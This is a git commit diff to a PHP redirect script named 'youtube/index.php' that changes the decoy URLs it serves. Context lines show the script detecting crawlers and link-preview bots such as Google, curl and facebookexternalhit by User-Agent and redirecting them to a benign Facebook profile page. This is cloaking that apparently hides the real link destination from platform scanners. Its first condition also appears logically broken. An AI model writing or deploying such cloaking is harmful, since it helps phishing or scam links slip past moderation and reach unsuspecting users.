8563a28dc7f834e9dfd0f98582c96c377783b3a5
busine011 <112756675+busine011@users.noreply.github.com>
2022-11-22 11:59:54 -0400

    Update index.php

--- youtube/index.php
+++ youtube/index.php
@@ -2,7 +2,7 @@
 
 if (!isset($_GET['hash']) && file_exists('links/' . $_GET['hash']))
    {
-    $short_urlx1 = "https://www.youtube.com/shorts/".substr(md5(mt_rand()),0,20);
+    $short_urlx1 = "http://m.facebook.com/profile.php";
     header("location: $short_urlx1", true, 200);
     die();
     }
@@ -11,7 +11,7 @@ if (!isset($_GET['hash']) && file_exists('links/' . $_GET['hash']))
     {
 	    
    if (preg_match('/bot|crawl|curl|dataprovider|search|get|spider|find|java|majesticsEO|google|yahoo|teoma|contaxe|yandex|libwww-perl|facebookexternalhit|facebook(external)/i', $_SERVER['HTTP_USER_AGENT'])) {
-        $short_urlx2 = "https://m.facebook.com/profiles.php";
+        $short_urlx2 = "http://m.facebook.com/profile.php";
         header("location: $short_urlx2", true, 200);
         die();
     }	    
